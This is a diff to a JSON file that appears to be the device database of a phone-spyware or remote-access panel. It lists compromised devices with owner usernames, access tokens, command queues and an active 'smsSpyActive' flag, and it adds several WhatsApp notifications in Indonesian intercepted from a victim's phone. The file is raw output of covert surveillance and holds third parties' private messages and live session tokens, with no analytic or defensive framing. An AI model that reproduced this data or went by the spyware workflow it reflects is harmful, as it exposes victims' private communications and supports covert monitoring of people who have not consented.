@@ -4,7 +4,7 @@
     "deviceName": "HP-ABLO-F55F",
     "ownerUsername": "Zarr",
     "token": "7055f57f74cb7eef5034e3301d747b14",
-    "lastSeen": 1777804772963,
+    "lastSeen": 1777804775965,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T05:33:28.300Z",
@@ -52,6 +52,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB² || ALL GAME || DITZ STORE 116 (4 pesan): ~ d¡tz4youz",
+        "content": "sory main culik",
+        "time": "03/05 17:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777804781446
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "JB² || ALL GAME || DITZ STORE 116",
+        "content": "‎4 pesan baru",
+        "time": "03/05 17:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777804778128
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB² || ALL GAME || DITZ STORE 116 (4 pesan): ~ d¡tz4youz",
+        "content": "sory main culik",
+        "time": "03/05 17:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777804777966
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "JB² || ALL GAME || DITZ STORE 116",
+        "content": "‎3 pesan baru",
+        "time": "03/05 17:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777804776470
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB² || ALL GAME || DITZ STORE 116 (3 pesan): ~ d¡tz4youz",
+        "content": "bantu send ke temen² kalian",
+        "time": "03/05 17:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777804776254
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "JB² || ALL GAME || DITZ STORE 116",
+        "content": "‎3 pesan baru",
+        "time": "03/05 17:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777804775525
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎JB² || ALL GAME || DITZ STORE 116 (3 pesan): ~ d¡tz4youz",
@@ -4413,7 +4461,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777804774258,
+    "lastSeen": 1777804780248,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
